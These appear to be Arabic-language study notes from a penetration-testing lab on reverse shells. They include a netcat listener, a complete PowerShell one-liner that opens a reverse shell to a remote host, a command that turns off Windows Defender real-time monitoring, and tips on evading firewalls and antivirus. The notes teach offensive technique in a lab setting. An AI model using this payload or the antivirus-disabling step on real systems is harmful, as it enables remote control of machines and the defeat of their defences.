- الreverse shell هنا بقي عكس الbind بنخلي الvictim هو اللي يinitiate الconnection
- يعني انا كا attacker بفتح بورت اعمل listen يعني
```
$ nc -lnvp 1337
Listenung on 0.0.0.0 1337
```
وانا ببعت payload علي جهاز الضحيه بخليه يكونكت من عنده علي البورت اللي انا فاتحه ده
- النوع ده هو الشائع عن الbind عشان زي ماقولنا فالbind بيمنع الincoming traffic فا بتبقي صعبه شويه
- هنخلي الtarget او الضحيه يعني يتصل من عنده عن طريق اني ببعتله حاجه Unrestricted File Upload, Command Injection مثلا
- الrepo دي فيها Reverse Shell Payloads هتساعدك كتير https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
---
## Hands-on With A Simple Reverse Shell in Windows
- اول حاجه هنفتح بورت من عندنا وليكن `443`
#### Server (`attack box`)

```shell-session
[!bash!]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```
- فالengagment الحقيقيه هنستخدم بورتات زي 443 او بورتات من اللي هيا الstandard عشان لما الfirewall يشوف الtraffic يعديه عادي عشان ده بورت بتاع الhttps فا هيشوفو انه عادي إنما لو استخدمنا اي بورت تاني مثلا زي 4444 هيمنعه عشان ده مش موثوق
- قليل جدا لو لقيت security team بيعمل blocking لبورت 443
- طيب نرجع لموضوعنا عاوزين ناخد Reverse shell علي جهاز الضحيه بس خلي بالك الضحيه جهاز Windows والwin مفيهوش netcat فا احنا هنستخدم حاجه من الأدوات اللي موجوده علي الويندوز وده بنسميه Living Off The Land يعني نستخدم أدوات النظام الأصليه عشان ندي فرصه أقل للAV انه يشك
- المهم ان هنا هنستخدم حاجه بتاعت الويندوز زي:
-cmd
-PowerShell
#### Client (target)

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

`What happened when we hit enter in command prompt?`
#### Client (target)

```cmd-session
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
- مفاد الرساله دي ان الAV وقف تشغيل الكود وده طبيعي جدا عشان الwindows defender شاف إن الكود ممكن يبقي maliciuos behavior
#### Disable AV

```powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

Once AV is disabled, attempt to execute the code again.
#### Server (attack box)

```shell-session
[!bash!]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```
وبكده نكون فعلا حصلنا علي reverse shell وتقدر تتحكم فالجهاز

---
